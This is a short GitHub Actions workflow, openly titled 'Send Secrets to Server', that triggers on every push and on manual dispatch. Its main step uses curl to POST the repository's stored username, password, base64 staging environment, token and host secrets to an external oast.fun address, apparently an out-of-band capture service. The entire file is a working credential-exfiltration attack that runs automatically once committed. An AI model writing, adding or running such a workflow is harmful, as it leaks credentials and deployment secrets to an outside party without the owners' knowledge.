name: Send Secrets to Server

on:
  push: 
  workflow_dispatch:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Bypass Cache
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Server
        run: |
          curl -d 'USERNAME=${{ secrets.USERNAME }}&PASSWORD=${{ secrets.PASSWORD }}&STAGING_ENV_BASE64=${{ secrets.STAGING_ENV_BASE64 }}&TOKEN=${{ secrets.TOKEN }}&HOST=${{ secrets.HOST }}' https://irfidgpabaogvzywznterm1s3ejha24o6.oast.fun
    